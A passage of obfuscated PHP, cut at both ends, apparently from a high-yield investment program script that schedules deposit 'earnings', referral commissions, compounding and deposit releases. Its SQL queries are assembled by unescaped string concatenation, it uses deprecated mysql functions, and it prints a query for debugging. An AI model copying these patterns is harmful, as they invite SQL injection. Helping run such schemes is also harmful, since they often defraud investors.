      	last_pay_date = last_pay_date + interval ' . $elnlcbScM . ' ' . $elnlcrSHlb . ' where id =' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlcOsDxl = mysql_query ($q);
      while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
      {
        if ($elnlcweaeO[$elnlcMVquv['elnlceIFKy']] == 1)
        {
          $elnlcHFhe = floor ($elnlcweaeO[$elnlcMVquv['elnlcSFFJ']] / 5) * 7 + $elnlcweaeO[$elnlcMVquv['elnlcSFFJ']] % 5;
          $elnlcihWzS = $elnlcweaeO[$elnlcMVquv['elnlchfQPl']] - (0 < $elnlcweaeO[$elnlcMVquv['elnlchfQPl']] ? 1 : 0);
          $elnlcsDvj = '' . ' (' . $elnlcHFhe . ' + ((' . $elnlcweaeO[$elnlcMVquv['elnlcSFFJ']] . ' % 5 + WEEKDAY(deposit_date)) > 5)*2 + ' . $elnlcihWzS . ') ';
        }
        else
        {
          $elnlcHFhe = $elnlcweaeO[$elnlcMVquv['elnlcSFFJ']] + $elnlcweaeO[$elnlcMVquv['elnlchfQPl']] - (0 < $elnlcweaeO[$elnlcMVquv['elnlchfQPl']] ? 1 : 0);
          $elnlcsDvj = '' . ' ' . $elnlcHFhe . ' ';
        }

        $elnlczmvck = $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
        if ($elnlcweaeO[$elnlcMVquv['elnlcklkzi']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlczmvck . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcOCuyb . ' and 
                (
                   deposit_date + interval ' . $elnlcsDvj . ' ' . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                      or
                   deposit_date + interval ' . $elnlcsDvj . ' ') . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ('' . ' < now()
                )
                and
                (
                   (' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' = 0) || (' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' && (deposit_date + interval ' . $elnlcweaeO[$elnlcMVquv['elnlcjcqSs']] . ' ') . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlctngR = mysql_query ($q);
          while ($elnlcCSJwr = mysql_fetch_array ($elnlctngR))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlcCSJwr[$elnlcMVquv['elnlcDuaas']] . ',
      		amount = ' . $elnlcCSJwr[$elnlcMVquv['elnlcTmBuz']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcCSJwr[$elnlcMVquv['elnlcTmBuz']] . ',
                ec = ' . $elnlcCSJwr[$elnlcMVquv['elnlcghgyP']] . ',
      		date = \'' . $elnlcCSJwr[$elnlcMVquv['elnlcWdFBh']] . ('' . '\' + interval ' . $elnlcHFhe . ' ') . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlcCSJwr[$elnlcMVquv['elnlcEAKA']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcOCuyb . ' and 
    	       (deposit_date + interval ' . $elnlcsDvj . ' ' . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                  or
                deposit_date + interval ' . $elnlcsDvj . ' ') . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ('' . ' < now()) and
               ((' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' = 0) || (' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' && (deposit_date + interval ' . $elnlcweaeO[$elnlcMVquv['elnlcjcqSs']] . ' ') . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlczmvck . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlcrcbi ($elnlcDHFI)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    $elnlcgnUmP = array ();
    if (($elnlcpvEj[$elnlcMVquv['elnlcazAsR']] == 1 AND $elnlcDHFI != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
    while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
    {
      $elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcPFCS']]][$elnlcweaeO[$elnlcMVquv['elnlcEAKA']]] = $elnlcweaeO;
    }

    $elnlcmtyy = $elnlcMVquv['elnlczUlK'];
    $elnlcMWRE = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcJgeH'])
    {
      $elnlcOoBBi = 't.send_profit_to_stocks,t.send_percent_to_stocks';
      $elnlcaSHTR = ' t.pay_by_button = 0 and';
    }

    if ($elnlcDHFI == -1)
    {
      $elnlcMWRE = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcDHFI . ' and status = \'on\'';
    }

    if ($elnlcDHFI == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcdMMth = mysql_query ($q) OR print mysql_error ());
    while ($elnlcoEboR = mysql_fetch_array ($elnlcdMMth))
    {
      $elnlcOCuyb = $elnlcoEboR[$elnlcMVquv['elnlcEAKA']];
      $elnlcRUFiM = fopen ('' . './tmpl_c/lock_user' . $elnlcOCuyb, 'w+');
      if (flock ($elnlcRUFiM, LOCK_EX))
      {
      }
      else
      {
        fclose ($elnlcRUFiM);
        continue;
      }

      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcOCuyb;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcmtyy = $elnlcMVquv['elnlczUlK'];
      $q = 'select max(p.min_deposit) as min_deposit, p.parent as type_id from hm2_plans as p group by p.parent';
      ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
      while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
      {
        $q = '' . 'select max_deposit as max_amount from hm2_plans where parent = ' . $elnlcweaeO[$elnlcMVquv['elnlcLkwpt']] . ' and min_deposit = ' . $elnlcweaeO[$elnlcMVquv['elnlcfKMP']];
        ($elnlcyvrz = mysql_query ($q) OR print mysql_error ());
        while ($elnlcpKcsw = mysql_fetch_array ($elnlcyvrz))
        {
          $elnlcHKfs[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]] = $elnlcpKcsw[$elnlcMVquv['elnlcWpKc']];
        }
      }

      while (0 < $elnlcmtyy)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
/*              t.rpcp as rpcp,*/
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              t.delay as delay,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              ' . $elnlcOoBBi . '
              t.return_profit as return_profit,
              t.return_profit_percent as return_profit_percent
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcOCuyb . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              ' . $elnlcaSHTR . '
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
        $elnlcmtyy = $elnlcMVquv['elnlcvCqE'];
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          ++$elnlcmtyy;
          if (!isset ($elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]]))
          {
            continue;
          }

          $elnlcISOHc = $elnlcMVquv['elnlcvCqE'];
          $elnlcDPDR = $elnlcMVquv['elnlcvCqE'];
          reset ($elnlcgnUmP);
          reset ($elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]]);
          while (list ($elnlcTrrSU, $elnlcsBcy) = each ($elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]]))
          {
            if (($elnlcsBcy[$elnlcMVquv['elnlcfKMP']] <= $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] AND ($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] <= $elnlcsBcy[$elnlcMVquv['elnlchpJfW']] OR $elnlcsBcy[$elnlcMVquv['elnlchpJfW']] == 0)))
            {
              $elnlcISOHc = $elnlcsBcy[$elnlcMVquv['elnlcHlxD']];
            }

            if (($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] < $elnlcsBcy[$elnlcMVquv['elnlcfKMP']] AND $elnlcISOHc == 0))
            {
              $elnlcISOHc = $elnlcDPDR;
            }

            if (($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] < $elnlcsBcy[$elnlcMVquv['elnlcfKMP']] AND 0 < $elnlcISOHc))
            {
              break;
            }

            $elnlcDPDR = $elnlcsBcy[$elnlcMVquv['elnlcHlxD']];
          }

          if (($elnlcsBcy[$elnlcMVquv['elnlchpJfW']] != 0 AND $elnlcsBcy[$elnlcMVquv['elnlchpJfW']] < $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']]))
          {
            $elnlcISOHc = $elnlcDPDR;
          }

          $elnlcedHr = $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] * $elnlcISOHc / 100;
          $elnlcbScM = '';
          if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcnUfdl'])
          {
            $elnlcbScM = ' 1 day ';
          }
          else
          {
            if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'])
            {
              $elnlcbScM = ' 1 hour ';
            }
            else
            {
              if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcAHESL'])
              {
                $elnlcbScM = ' 7 day ';
              }
              else
              {
                if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == 'b-w')
                {
                  $elnlcbScM = ' 14 day ';
                }
                else
                {
                  if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcxNIBb'])
                  {
                    $elnlcbScM = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcBGldC'])
                    {
                      $elnlcbScM = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcWnLN'])
                      {
                        $elnlcbScM = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcxvGKb'])
                        {
                          $elnlcbScM = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcbPEu'])
                          {
                            $elnlcbScM = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcJfaAK'])
                            {
                              $elnlcbScM = ' ' . $elnlcweaeO[$elnlcMVquv['elnlcSFFJ']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcISOHc == 0 AND $elnlcbScM == ''))
          {
            continue;
          }

          $elnlcymxx = -1;
          $q = 'select weekday(\'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ') as dw');
          ($elnlcyvrz = mysql_query ($q) OR print mysql_error ());
          while ($elnlcpKcsw = mysql_fetch_array ($elnlcyvrz))
          {
            $elnlcymxx = $elnlcpKcsw[$elnlcMVquv['elnlcESExA']];
          }

          $q = 'select count(id) as `col` from hm2_history where 
		type = \'earning\' and ' . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ') and ')) . ' deposit_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
          ($elnlcdMkuu = mysql_query ($q) OR print mysql_error ());
          $elnlcsPjz = $elnlcMVquv['elnlcvCqE'];
          while ($elnlcqQRC = mysql_fetch_array ($elnlcdMkuu))
          {
            $elnlcsPjz = $elnlcqQRC[$elnlcMVquv['elnlcxwjRE']];
          }

          if ($elnlcsPjz == 0)
          {
            if ((5 <= $elnlcymxx AND $elnlcweaeO[$elnlcMVquv['elnlceIFKy']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcymxx == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                    ec = ') . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
              (mysql_query ($q) OR print mysql_error ());
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ('' . ',
                    amount = ' . $elnlcedHr . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcpvEj[$elnlcMVquv['elnlcapEpp']] . number_format ($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']], 2) . ('' . ' - ' . $elnlcISOHc . ' %\',
                    actual_amount = ' . $elnlcedHr . ',
                    date = \'') . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                    ec = ') . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcgCEk'])
              {
                if ((0 < $elnlcoEboR[$elnlcMVquv['elnlcwITI']] AND 0 < $elnlcpvEj[$elnlcMVquv['elnlcwBjLQ']]))
                {
                  $elnlcqIGW = $elnlcedHr * $elnlcpvEj[$elnlcMVquv['elnlcwBjLQ']] / 100;
                  $elnlcIPSwB = elnlckjnjt ($elnlcoEboR[$elnlcMVquv['elnlcRzkgp']]);
                  if ($elnlcpvEj[$elnlcMVquv['elnlckyJIs']] <= $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']])
                  {
                    $q = '' . 'select max(actual_amount) as maxam from hm2_deposits where user_id = ' . $elnlcoEboR[$elnlcMVquv['elnlcwITI']] . ' and status = \'on\'';
                    ($elnlcyvrz = mysql_query ($q) OR print mysql_error ());
                    $elnlcGEwpD = $elnlcMVquv['elnlcvCqE'];
                    while ($elnlcpKcsw = mysql_fetch_array ($elnlcyvrz))
                    {
                      $elnlcGEwpD = $elnlcpKcsw[$elnlcMVquv['elnlcGOdPe']];
                    }

                    if ($elnlcpvEj[$elnlcMVquv['elnlcoaQnz']] <= $elnlcGEwpD)
                    {
                      $q = '' . 'insert into hm2_history set user_id = ' . $elnlcoEboR[$elnlcMVquv['elnlcwITI']] . ',
			amount = ' . $elnlcqIGW . ',
			type = \'commissions\',
			description = \'Daily referral earning from user ' . $elnlcIPSwB . '\',
			actual_amount = ' . $elnlcqIGW . ',
			date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                        ec = ' . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
			str = \'gg\'');
                      (mysql_query ($q) OR print mysql_error ());
                    }
                  }
                }
              }

              if (($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcJgeH'] AND $elnlcweaeO[$elnlcMVquv['elnlcKaew']]))
              {
                $elnlcbCur = floor ($elnlcedHr * $elnlcweaeO[$elnlcMVquv['elnlcLsBmS']]) / 100;
                if (0 < $elnlcbCur)
                {
                  $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ('' . ',
                      amount = -' . $elnlcbCur . ',
                      type = \'penality\',
                      description = \'Earning moved to Stocks account\',
                      actual_amount = -' . $elnlcbCur . ',
                      date = \'') . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                      ec = ') . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                      str = \'gg\',
                      deposit_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = 'insert into sh2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ('' . ',
                      amount = ' . $elnlcbCur . ',
                      type = \'bonus\',
                      description = \'Earning received to buy shares\',
                      actual_amount = ' . $elnlcbCur . ',
                      date = \'') . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                      ec = ') . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                      str = \'gg\'';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }

          $elnlcrSHlb = '';
          if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcJfaAK'])
          {
            if (($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] == 0 OR ($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] AND $elnlcweaeO[$elnlcMVquv['elnlcwUsO']])))
            {
              $elnlcrSHlb = ', status = \'off\'';
            }

            if (($elnlcweaeO[$elnlcMVquv['elnlcklkzi']] == 1 AND ($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] == 0 OR ($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] AND $elnlcweaeO[$elnlcMVquv['elnlcwUsO']]))))
            {
              $elnlckgpt = $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']];
              $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ',
                    amount = ' . $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlckgpt . ',
                    ec = ' . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ('' . ',
                    date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . '\' + interval ' . $elnlcbScM . ',
                    deposit_id = ') . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']] . ',
                    description = \'Deposit release\'';
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlccmcH'])
              {
                if (0 < $elnlcweaeO[$elnlcMVquv['elnlcokxs']])
                {
                  $q = '' . 'select sum(actual_amount) as amt from hm2_history where deposit_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']] . ' and type = \'earning\' and user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']];
                  print $q;
                  ($elnlcoQDCf = mysql_query ($q) OR print mysql_error ());
                  $elnlcfqiy = $elnlcMVquv['elnlcvCqE'];
                  while ($elnlcwcTlt = mysql_fetch_array ($elnlcoQDCf))
                  {
                    $elnlcfqiy = $elnlcwcTlt[$elnlcMVquv['elnlcMpaI']];
                  }

                  $elnlcDTSUB = ($elnlckgpt + $elnlcfqiy) * $elnlcweaeO[$elnlcMVquv['elnlcokxs']] / 100;
                  $elnlcihWzS = intval ($elnlcweaeO[$elnlcMVquv['elnlchfQPl']]);
                  $q = '' . 'insert into hm2_deposits set 
		           user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ',
		           type_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcLkwpt']] . ',
		           deposit_date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . '\' + interval ' . $elnlcbScM . ',
		           last_pay_date = (\'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . '\' + interval ' . $elnlcbScM . ') + interval ' . $elnlcihWzS . ' day,
		           status = \'on\',
		           amount = ' . $elnlcDTSUB . ',
		           actual_amount = ' . $elnlcDTSUB . ',
		           compound = 0,
		           ec = ' . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                  $elnlcbooUx = mysql_insert_id ();
                  $q = '' . 'insert into hm2_history set 
		           user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ',
		           amount = -' . $elnlcDTSUB . ',
		           actual_amount = -' . $elnlcDTSUB . ',
		           type=\'deposit\',
		           date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . '\' + interval ' . $elnlcbScM . ',
		           description = \'Deposit (reinvest)\',
		           ec = ' . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
		           deposit_id = ' . $elnlcbooUx . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }
          else
          {
            if ((5 <= $elnlcymxx AND $elnlcweaeO[$elnlcMVquv['elnlceIFKy']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcweaeO[$elnlcMVquv['elnlcokxs']] AND $elnlcweaeO[$elnlcMVquv['elnlcokxs']] <= 100) AND $elnlcweaeO[$elnlcMVquv['elnlcrBwT']] == 1))
              {
                if ($elnlcweaeO[$elnlcMVquv['elnlcRvKp']] == 0)
                {
                  $elnlcweaeO[$elnlcMVquv['elnlcRvKp']] = $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] + 1;
                }

                if (($elnlcweaeO[$elnlcMVquv['elnlcSUgEI']] <= $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] AND $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] <= $elnlcweaeO[$elnlcMVquv['elnlcRvKp']]))
                {
                  if ($elnlcweaeO[$elnlcMVquv['elnlcpEow']] == 1)
                  {
                    $elnlcGRIUs = preg_split ('/\\s*,\\s*/', $elnlcweaeO[$elnlcMVquv['elnlcGrJhm']]);
                    if (!in_array ($elnlcweaeO[$elnlcMVquv['elnlcokxs']], $elnlcGRIUs))
                    {
                      $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcGRIUs[0];
                    }
                  }
                  else
                  {
                    if ($elnlcweaeO[$elnlcMVquv['elnlcokxs']] < $elnlcweaeO[$elnlcMVquv['elnlcbKUSb']])
                    {
                      $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcweaeO[$elnlcMVquv['elnlcbKUSb']];
                    }

                    if ($elnlcweaeO[$elnlcMVquv['elnlcqOjLh']] < $elnlcweaeO[$elnlcMVquv['elnlcokxs']])
                    {
                      $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcweaeO[$elnlcMVquv['elnlcqOjLh']];
                    }
                  }
                }
                else
                {
                  $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcMVquv['elnlcvCqE'];
                }

                if ((0 < $elnlcweaeO[$elnlcMVquv['elnlcokxs']] AND $elnlcweaeO[$elnlcMVquv['elnlcokxs']] <= 100))
                {
                  $elnlcjFKz = $elnlcedHr * $elnlcweaeO[$elnlcMVquv['elnlcokxs']] / 100;
                  $elnlcedHr = floor ((floor ($elnlcedHr * 100000) / 100000 - floor ($elnlcjFKz * 100000) / 100000) * 100) / 100;
                  if (($elnlcHKfs[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]] == 0 OR $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] + $elnlcjFKz < $elnlcHKfs[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]]))
                  {
                    $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ('' . ',
                        amount = -' . $elnlcjFKz . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcjFKz . ',
                    		ec = ') . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                    		date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                                deposit_id = ') . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
                    (mysql_query ($q) OR print mysql_error ());
                    $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcjFKz . ',
                    		actual_amount = actual_amount + ' . $elnlcjFKz . '
                    		where id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
                    (mysql_query ($q) OR print mysql_error ());
                  }
                }
              }

              elnlckhlr ($elnlcweaeO[$elnlcMVquv['elnlcEAKA']], $elnlcedHr, 'date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcbScM . ' ' . $elnlcrSHlb . ' where id =' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcJgeH'])
      {
        $q = 'select * from hm2_types where q_days > 0 and pay_by_button != 1';
      }
      else
      {
        $q = 'select * from hm2_types where q_days > 0';
      }

      $elnlcOsDxl = mysql_query ($q);
      while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
      {
        $elnlcHFhe = $elnlcweaeO[$elnlcMVquv['elnlcSFFJ']] + $elnlcweaeO[$elnlcMVquv['elnlchfQPl']] - (0 < $elnlcweaeO[delay] ? 1 : 0);
        $elnlczmvck = $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
        if ($elnlcweaeO[$elnlcMVquv['elnlcklkzi']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlczmvck . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcOCuyb . ' and 
